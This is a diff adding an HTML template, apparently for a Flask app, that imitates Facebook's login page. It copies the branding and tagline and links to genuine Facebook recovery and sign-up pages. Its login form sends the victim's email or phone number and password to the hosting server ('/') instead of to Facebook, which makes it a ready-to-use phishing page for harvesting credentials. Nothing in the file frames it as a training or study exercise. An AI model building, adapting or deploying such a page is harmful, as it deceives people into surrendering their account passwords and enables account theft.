@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="ahmedlaib">
+  <meta name="theme-color" content=" #1877f2">
+  <title>Facebook</title>
+  <link rel="stylesheet" href="{{url_for('index.static',filename = 'css/style.css')}}">
+
+  <link rel="shortcut icon" href="{{url_for('index.static',filename = 'img/favicon.ico')}}" type="image/x-icon" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="content">
+
+
+    <div class="h1">
+      <h1 class="h">facebook</h1>
+      <p class="pr">
+        Facebook helps you connect and share with the people in your life.
+      </p>
+    </div>
+    <form class="main" action="/" method="post">
+      <input type="text" placeholder="Email address or phone number" class="txt" name="email"><br>
+      <input type="password" placeholder="Password" class="txt" name="Pass"><br>
+      <input type="submit" value="Log In" class="login-btn" id="000" name="sub"><br>
+      <div class="a-link">
+        <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr" class="link">Forgotten Password?</a>
+      </div>
+      <div class="ca">
+        <a href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&soft=hjk" class="pca">Create New Account</a>
+
+      </div>
+    </form>
+  </div>
+</body>
+</html>
